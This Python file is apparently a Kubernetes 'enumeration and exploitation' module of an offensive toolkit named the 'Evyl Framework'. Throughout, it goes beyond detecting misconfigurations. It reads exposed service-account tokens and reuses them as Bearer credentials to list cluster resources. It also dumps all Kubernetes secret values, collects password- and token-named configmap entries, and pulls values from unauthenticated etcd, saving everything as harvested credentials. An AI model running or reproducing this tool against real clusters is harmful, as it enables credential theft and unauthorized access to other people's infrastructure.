"""
Kubernetes Scanner for Evyl Framework

Comprehensive Kubernetes enumeration and exploitation module.
"""

import asyncio
import aiohttp
import json
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse

from utils.logger import Logger
from utils.network import NetworkManager

class KubernetesScanner:
    """Kubernetes enumeration and exploitation scanner"""
    
    def __init__(self):
        self.logger = Logger()
        self.network_manager = NetworkManager()
        
        # Kubernetes API endpoints
        self.api_endpoints = [
            '/api/v1/namespaces',
            '/api/v1/pods',
            '/api/v1/services',
            '/api/v1/secrets',
            '/api/v1/configmaps',
            '/api/v1/nodes',
            '/api/v1/serviceaccounts',
            '/apis/apps/v1/deployments',
            '/apis/rbac.authorization.k8s.io/v1/clusterroles',
            '/apis/rbac.authorization.k8s.io/v1/clusterrolebindings',
        ]
        
        # Service account token locations
        self.token_paths = [
            '/var/run/secrets/kubernetes.io/serviceaccount/token',
            '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
            '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
        ]
        
        # Kubelet endpoints
        self.kubelet_endpoints = [
            ':10250/metrics',
            ':10250/pods',
            ':10250/runningpods',
            ':10250/stats/summary',
            ':10255/metrics',
            ':10255/pods',
        ]
        
        # etcd endpoints
        self.etcd_endpoints = [
            ':2379/v2/keys',
            ':2379/v2/keys/registry',
            ':2379/v2/keys/registry/secrets',
            ':2379/v2/keys/registry/configmaps',
            ':2380/metrics',
        ]
    
    async def scan(self, target: str) -> Dict[str, Any]:
        """Main scan function"""
        results = {
            'target': target,
            'vulnerabilities': [],
            'credentials': [],
            'api_access': False,
            'service_account_access': False,
            'kubelet_access': False,
            'etcd_access': False
        }
        
        # Check service account token access
        await self._check_service_account_tokens(target, results)
        
        # Check Kubernetes API access
        await self._check_api_access(target, results)
        
        # Check kubelet access
        await self._check_kubelet_access(target, results)
        
        # Check etcd access
        await self._check_etcd_access(target, results)
        
        return results
    
    async def _check_service_account_tokens(self, target: str, results: Dict[str, Any]):
        """Check for exposed service account tokens"""
        self.logger.debug(f"Checking service account tokens for {target}")
        
        for token_path in self.token_paths:
            try:
                url = urljoin(target, token_path)
                
                async with aiohttp.ClientSession() as session:
                    headers = self.network_manager.get_headers()
                    
                    async with session.get(url, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            if 'token' in token_path and content:
                                results['service_account_access'] = True
                                results['credentials'].append({
                                    'type': 'kubernetes_service_account_token',
                                    'value': content.strip(),
                                    'url': url,
                                    'path': token_path
                                })
                                
                                self.logger.credential_found('kubernetes_token', url)
                                
                                # Try to use token for API access
                                await self._test_token_access(target, content.strip(), results)
                            
                            results['vulnerabilities'].append({
                                'type': 'exposed_service_account_file',
                                'severity': 'high',
                                'url': url,
                                'path': token_path,
                                'description': f'Service account file exposed: {token_path}'
                            })
                            
            except Exception as e:
                self.logger.debug(f"Error checking {token_path}: {e}")
    
    async def _test_token_access(self, target: str, token: str, results: Dict[str, Any]):
        """Test API access with service account token"""
        try:
            api_url = urljoin(target, '/api/v1/namespaces')
            headers = {
                'Authorization': f'Bearer {token}',
                **self.network_manager.get_headers()
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers=headers, ssl=False) as response:
                    if response.status == 200:
                        results['api_access'] = True
                        namespaces_data = await response.text()
                        
                        results['vulnerabilities'].append({
                            'type': 'kubernetes_api_access',
                            'severity': 'critical',
                            'url': api_url,
                            'description': 'Kubernetes API accessible with service account token',
                            'token_snippet': token[:20] + '...'
                        })
                        
                        # Extract additional information
                        await self._enumerate_api_resources(target, token, results)
                        
        except Exception as e:
            self.logger.debug(f"Error testing token access: {e}")
    
    async def _enumerate_api_resources(self, target: str, token: str, results: Dict[str, Any]):
        """Enumerate accessible API resources"""
        headers = {
            'Authorization': f'Bearer {token}',
            **self.network_manager.get_headers()
        }
        
        accessible_resources = []
        
        for endpoint in self.api_endpoints:
            try:
                url = urljoin(target, endpoint)
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            accessible_resources.append(endpoint)
                            data = await response.text()
                            
                            # Extract secrets from response
                            if 'secrets' in endpoint:
                                await self._extract_secrets_from_response(data, url, results)
                            elif 'configmaps' in endpoint:
                                await self._extract_configmaps_from_response(data, url, results)
                            
            except Exception as e:
                self.logger.debug(f"Error accessing {endpoint}: {e}")
        
        if accessible_resources:
            results['vulnerabilities'].append({
                'type': 'kubernetes_excessive_permissions',
                'severity': 'high',
                'description': f'Token has access to {len(accessible_resources)} API endpoints',
                'accessible_endpoints': accessible_resources
            })
    
    async def _extract_secrets_from_response(self, data: str, url: str, results: Dict[str, Any]):
        """Extract secrets from Kubernetes API response"""
        try:
            secrets_data = json.loads(data)
            
            if 'items' in secrets_data:
                for secret in secrets_data['items']:
                    if 'data' in secret:
                        secret_name = secret.get('metadata', {}).get('name', 'unknown')
                        namespace = secret.get('metadata', {}).get('namespace', 'default')
                        
                        for key, value in secret['data'].items():
                            results['credentials'].append({
                                'type': 'kubernetes_secret',
                                'secret_name': secret_name,
                                'namespace': namespace,
                                'key': key,
                                'value': value,  # Base64 encoded
                                'url': url
                            })
                            
                            self.logger.credential_found(f'k8s_secret_{key}', url)
                        
        except json.JSONDecodeError:
            pass
        except Exception as e:
            self.logger.debug(f"Error extracting secrets: {e}")
    
    async def _extract_configmaps_from_response(self, data: str, url: str, results: Dict[str, Any]):
        """Extract configmaps from Kubernetes API response"""
        try:
            configmaps_data = json.loads(data)
            
            if 'items' in configmaps_data:
                for configmap in configmaps_data['items']:
                    if 'data' in configmap:
                        cm_name = configmap.get('metadata', {}).get('name', 'unknown')
                        namespace = configmap.get('metadata', {}).get('namespace', 'default')
                        
                        for key, value in configmap['data'].items():
                            # Check if configmap contains sensitive data
                            if any(sensitive in key.lower() for sensitive in ['password', 'secret', 'key', 'token']):
                                results['credentials'].append({
                                    'type': 'kubernetes_configmap',
                                    'configmap_name': cm_name,
                                    'namespace': namespace,
                                    'key': key,
                                    'value': value,
                                    'url': url
                                })
                                
                                self.logger.credential_found(f'k8s_configmap_{key}', url)
                        
        except json.JSONDecodeError:
            pass
        except Exception as e:
            self.logger.debug(f"Error extracting configmaps: {e}")
    
    async def _check_api_access(self, target: str, results: Dict[str, Any]):
        """Check for unauthenticated Kubernetes API access"""
        self.logger.debug(f"Checking API access for {target}")
        
        for endpoint in self.api_endpoints:
            try:
                url = urljoin(target, endpoint)
                headers = self.network_manager.get_headers()
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            results['api_access'] = True
                            
                            results['vulnerabilities'].append({
                                'type': 'unauthenticated_api_access',
                                'severity': 'critical',
                                'url': url,
                                'endpoint': endpoint,
                                'description': 'Kubernetes API accessible without authentication'
                            })
                            
                            self.logger.vulnerability_found('kubernetes_api_exposure', url, 'critical')
                        
            except Exception as e:
                self.logger.debug(f"Error checking API endpoint {endpoint}: {e}")
    
    async def _check_kubelet_access(self, target: str, results: Dict[str, Any]):
        """Check for exposed kubelet endpoints"""
        self.logger.debug(f"Checking kubelet access for {target}")
        
        parsed_url = urlparse(target)
        base_host = f"{parsed_url.scheme}://{parsed_url.hostname}"
        
        for endpoint in self.kubelet_endpoints:
            try:
                port = endpoint.split(':')[1].split('/')[0]
                path = '/' + '/'.join(endpoint.split('/')[1:])
                url = f"{base_host}:{port}{path}"
                
                headers = self.network_manager.get_headers()
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            results['kubelet_access'] = True
                            
                            results['vulnerabilities'].append({
                                'type': 'exposed_kubelet',
                                'severity': 'high',
                                'url': url,
                                'endpoint': endpoint,
                                'description': f'Kubelet endpoint exposed: {endpoint}'
                            })
                            
                            self.logger.vulnerability_found('kubelet_exposure', url, 'high')
                        
            except Exception as e:
                self.logger.debug(f"Error checking kubelet endpoint {endpoint}: {e}")
    
    async def _check_etcd_access(self, target: str, results: Dict[str, Any]):
        """Check for exposed etcd endpoints"""
        self.logger.debug(f"Checking etcd access for {target}")
        
        parsed_url = urlparse(target)
        base_host = f"{parsed_url.scheme}://{parsed_url.hostname}"
        
        for endpoint in self.etcd_endpoints:
            try:
                port = endpoint.split(':')[1].split('/')[0]
                path = '/' + '/'.join(endpoint.split('/')[1:])
                url = f"{base_host}:{port}{path}"
                
                headers = self.network_manager.get_headers()
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            results['etcd_access'] = True
                            
                            results['vulnerabilities'].append({
                                'type': 'exposed_etcd',
                                'severity': 'critical',
                                'url': url,
                                'endpoint': endpoint,
                                'description': f'etcd endpoint exposed: {endpoint}'
                            })
                            
                            self.logger.vulnerability_found('etcd_exposure', url, 'critical')
                            
                            # Try to extract data from etcd
                            if 'keys' in endpoint:
                                await self._extract_etcd_data(url, results)
                        
            except Exception as e:
                self.logger.debug(f"Error checking etcd endpoint {endpoint}: {e}")
    
    async def _extract_etcd_data(self, url: str, results: Dict[str, Any]):
        """Extract sensitive data from etcd"""
        try:
            headers = self.network_manager.get_headers()
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, ssl=False) as response:
                    if response.status == 200:
                        data = await response.text()
                        etcd_data = json.loads(data)
                        
                        if 'node' in etcd_data and 'nodes' in etcd_data['node']:
                            for node in etcd_data['node']['nodes']:
                                if 'value' in node:
                                    results['credentials'].append({
                                        'type': 'etcd_data',
                                        'key': node.get('key', 'unknown'),
                                        'value': node['value'],
                                        'url': url
                                    })
                                    
                                    self.logger.credential_found('etcd_data', url)
                        
        except Exception as e:
            self.logger.debug(f"Error extracting etcd data: {e}")